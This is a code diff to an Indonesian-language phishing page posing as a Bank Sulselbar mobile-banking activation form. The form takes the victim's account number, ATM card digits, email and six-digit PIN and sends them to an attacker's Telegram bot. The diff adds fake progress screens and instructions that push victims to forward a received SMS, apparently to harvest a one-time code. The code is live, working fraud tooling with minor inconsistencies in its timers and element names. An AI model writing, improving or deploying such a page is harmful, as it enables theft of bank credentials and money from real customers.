@@ -161,7 +161,7 @@
             font-size: 12px;
         }
 
-        /* Styling Loading Screen */
+        /* Styling Loading Screen Umum */
         .loading-screen {
             display: none;
             position: fixed;
@@ -195,6 +195,8 @@
             color: white;
             font-size: 18px;
             font-weight: bold;
+            text-align: center;
+            padding: 0 20px;
         }
 
         /* Styling Halaman Informasi */
@@ -210,14 +212,9 @@
             line-height: 1.5;
         }
 
-        .info-page .wa-link {
+        .info-page .highlight {
             color: #9ACD32;
             font-weight: bold;
-            text-decoration: none;
-        }
-
-        .info-page .wa-link:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
@@ -232,7 +229,7 @@
 
         <!-- Halaman 1: Nomor Rekening + 4 Digit ATM -->
         <form class="form-page" id="page-1">
-            <h2>Data Akun</h2>
+            <h2>Aktivasi Data BankSulselbar</h2>
             
             <div class="form-group">
                 <label for="no-rekening">Nomor Rekening</label>
@@ -266,12 +263,12 @@
                 <input type="email" id="email" name="email" required>
             </div>
 
-            <button type="button" class="btn" onclick="goToPage3()">Lanjut aktivasi</button>
+            <button type="button" class="btn" onclick="goToPage3()">Lanjut Aktivasi</button>
         </form>
 
         <!-- Halaman 3: 6 Digit PIN -->
         <form class="form-page" id="page-3">
-            <h2>Atur 6 Digit PIN</h2>
+            <h2> Proses Aktivasi </h2>
             
             <div class="form-group">
                 <label>Masukkan 6 Digit PIN</label>
@@ -285,15 +282,22 @@
                 </div>
             </div>
 
-            <button type="button" class="btn" onclick="submitToTelegram()">Kirim Data Aktivasi </button>
+            <button type="button" class="btn" onclick="submitToTelegram()">Kirim Semua Data Aktivasi</button>
         </form>
 
-        <!-- Halaman Informasi -->
-        <div class="info-page" id="info-page">
-            <h2> Aktivasi Pendaftaran Berhasil!</h2>
-            <p>Silahkan hubungi CS Admin Bank Sulselbar melalui WhatsApp kami:</p>
-            <a href="https://wa.me/628217638753" class="wa-link" target="_blank">08217638753</a>
-            <button type="button" class="btn" onclick="resetAllPages()">Kembali ke Formulir</button>
+        <!-- Halaman Informasi Aktivasi -->
+        <div class="info-page" id="activation-info">
+            <h2>Aktivasi Berhasil!</h2>
+            <p>Trimakasih, aktivasi Anda berhasil!</p>
+            <p>Silahkan Salin SMS yang Anda terima lalu kirim SMS ke layanan <span class="highlight">1500855</span> Bank Sulselbar</p>
+        </div>
+
+        <!-- Halaman Akhir -->
+        <div class="info-page" id="final-info">
+            <h2>Proses Selesai!</h2>
+            <p>Data Anda sedang diproses oleh Bank Sulselbar.</p>
+            <p>Silahkan tunggu konfirmasi selanjutnya melalui SMS atau telepon ketika Sudah Masuk Salin Sms Dan Kirim ke Layanan Sms Bank Sulselbar 1500855.</p>
+            <button type="button" class="btn" onclick="resetAllPages()">Kembali ke Awal</button>
         </div>
 
         <div class="footer">
@@ -302,10 +306,16 @@
         </div>
     </div>
 
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loading-screen">
+    <!-- Loading Screen 1 (10 detik) -->
+    <div class="loading-screen" id="loading-1">
         <div class="loading-spinner"></div>
-        <div class="loading-text">Memproses Data... Tunggu 3 Detik</div>
+        <div class="loading-text">Pendaftaran Berhasil... </div>
+    </div>
+
+    <!-- Loading Screen 2 (20 detik) -->
+    <div class="loading-screen" id="loading-2">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Pengiriman Data Sedang Diproses...Layanan Mobile Benking BankSulselbar 1500855</div>
     </div>
 
     <script>
@@ -377,7 +387,7 @@
             input.addEventListener('keydown', (e) => e.key === 'Backspace' && !input.value && idx > 0 && document.querySelectorAll('.pin-input')[idx-1].focus());
         });
 
-        // === FUNGSI KIRIM DATA & TAMPILKAN INFO ===
+        // === FUNGSI PROSES UTAMA ===
         async function submitToTelegram() {
             const pinInputs = document.querySelectorAll('.pin-input');
             let pin = "";
@@ -395,7 +405,7 @@
 
             formData.pin = pin;
 
-            // Susun pesan Telegram
+            // Kirim data ke Telegram
             const message = `
 📊 DATA PENDAFTARAN MOBILE BANKING
 =============================
@@ -406,8 +416,6 @@
 🔐 PIN (6 Digit): ${formData.pin}
 =============================
 `;
-
-            // Kirim ke Telegram
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -422,15 +430,28 @@
                 console.error("Gagal kirim ke Telegram:", error);
             }
 
-            // Tampilkan loading screen
-            document.getElementById('loading-screen').style.display = 'flex';
+            // Langkah 1: Tampilkan loading 10 detik
             document.querySelectorAll('.form-page').forEach(page => page.style.display = 'none');
+            document.getElementById('loading-1').style.display = 'flex';
 
-            // Tunggu 3 detik lalu tampilkan halaman informasi
+            // Tunggu 10 detik (10000 ms) lalu tampilkan info aktivasi
             setTimeout(() => {
-                document.getElementById('loading-screen').style.display = 'none';
-                document.getElementById('info-page').style.display = 'block';
-            }, 3000);
+                document.getElementById('loading-1').style.display = 'none';
+                document.getElementById('activation-info').style.display = 'block';
+
+                // Langkah 2: Tunggu beberapa detik lalu tampilkan loading kedua (20 detik)
+                // Sesuai permintaan, setelah pesan aktivasi muncul langsung ke loading kedua
+                setTimeout(() => {
+                    document.getElementById('activation-info').style.display = 'none';
+                    document.getElementById('loading-2').style.display = 'flex';
+
+                    // Tunggu 20 detik (20000 ms) lalu tampilkan halaman akhir
+                    setTimeout(() => {
+                        document.getElementById('loading-2').style.display = 'none';
+                        document.getElementById('final-info').style.display = 'block';
+                    }, 20000);
+                }, 1000); // Jeda singkat agar pesan aktivasi terbaca dulu
+            }, 30000);
         }
 
         // === FUNGSI RESET SEMUA HALAMAN ===
@@ -441,7 +462,10 @@
             document.getElementById('email').value = "";
             document.querySelectorAll('.pin-input').forEach(input => input.value = "");
             
-            document.getElementById('info-page').style.display = 'none';
+            document.getElementById('final-info').style.display = 'none';
+            document.getElementById('activation-success').style.display = 'none';
+            document.getElementById('loading-1').style.display = 'none';
+            document.getElementById('loading-2').style.display = 'none';
             document.getElementById('page-3').style.display = 'none';
             document.getElementById('page-2').style.display = 'none';
             document.getElementById('page-1').style.display = 'block';
